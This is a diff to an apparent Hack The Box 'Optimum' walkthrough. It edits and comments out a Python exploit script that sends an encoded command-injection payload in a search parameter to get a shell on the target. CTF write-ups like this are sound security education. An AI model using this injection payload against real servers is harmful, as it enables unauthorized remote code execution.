@@ -114,6 +114,8 @@ This is a script in python to exploit this machine.
 
 `optimum-getshell.py`
 
+<!--
+
 ```python
 #! /usr/bin/env python3
 
@@ -226,10 +228,10 @@ def weaponization(lhost,lport):
 def atkTarget(rhost,rport,lhost,lport):
     
     # Encode the payload and send a HTTP GET request
-    payloadd_encode = urllib.parse.quote_plus(payload)
+    payload_encode = urllib.parse.quote_plus(payload)
     
-    urll = f'http://{rhost}:{rport}/?search=%00{{.{payloadd_encode}.}}'
-    urllib.request.urlopen(urll)
+    url = f'http://{rhost}:{rport}/?search=%00{{.{payload_encode}.}}'
+    urllib.request.urlopen(url)
     print("\n[+] Sending encoded payload via GET request to target")
 
     # Print some information
@@ -254,9 +256,10 @@ def main():
 if __name__ == "__main__":
     parser()
     main()
-
 ```
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Optimum/Untitled%209.png)
 
  More scripts in [https://github.com/0xEtern4lW0lf](https://github.com/0xEtern4lW0lf).
+
+ -->
